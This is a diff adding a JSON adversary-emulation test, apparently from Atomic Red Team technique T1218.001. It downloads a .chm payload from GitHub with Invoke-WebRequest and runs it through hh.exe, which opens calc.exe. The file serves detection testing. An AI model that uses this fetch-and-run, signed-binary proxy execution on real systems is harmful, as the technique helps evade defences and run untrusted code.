@@ -1,0 +1,86 @@
+{
+  "id": "5cb87818-0d7c-4469-b7ef-9224107aebe8",
+  "name": "Compiled HTML Help Local Payload",
+  "description": "Uses hh.exe to execute a local compiled HTML Help payload.\nUpon execution calc.exe will open\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "748e3896-bb5b-4b6b-9149-1f10ff2f95fd",
+      "type": "execute-command",
+      "data": {
+        "command": "hh.exe \"#{local_chm_file}\"\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "d9796c9f-a7d1-4fb3-ac46-acd835a29316",
+      "name": "Check dependency 1/1",
+      "description": "The payload must exist on disk at specified location (#{local_chm_file})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{local_chm_file}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "32b82323-e40b-48fc-b9c2-13d8619817d9",
+      "name": "Resolve dependency 1/1",
+      "description": "The payload must exist on disk at specified location (#{local_chm_file})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item -Type Directory (split-path \"#{local_chm_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.001/src/T1218.001.chm\" -OutFile \"#{local_chm_file}\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "124bf887-50ed-4ad7-8ecc-21187778089e",
+      "name": "Re-check dependency 1/1",
+      "description": "The payload must exist on disk at specified location (#{local_chm_file})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{local_chm_file}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "d9796c9f-a7d1-4fb3-ac46-acd835a29316",
+      "p": "on-success",
+      "o": "748e3896-bb5b-4b6b-9149-1f10ff2f95fd"
+    },
+    {
+      "s": "d9796c9f-a7d1-4fb3-ac46-acd835a29316",
+      "p": "on-failure",
+      "o": "32b82323-e40b-48fc-b9c2-13d8619817d9"
+    },
+    {
+      "s": "32b82323-e40b-48fc-b9c2-13d8619817d9",
+      "p": "on-success",
+      "o": "124bf887-50ed-4ad7-8ecc-21187778089e"
+    },
+    {
+      "s": "124bf887-50ed-4ad7-8ecc-21187778089e",
+      "p": "on-failure",
+      "o": "748e3896-bb5b-4b6b-9149-1f10ff2f95fd"
+    }
+  ],
+  "tags": [
+    "T1218.001",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "local_chm_file",
+      "type": "path",
+      "description": "Local .chm payload",
+      "value": "PathToAtomicsFolder\\T1218.001\\src\\T1218.001.chm"
+    }
+  ]
+}
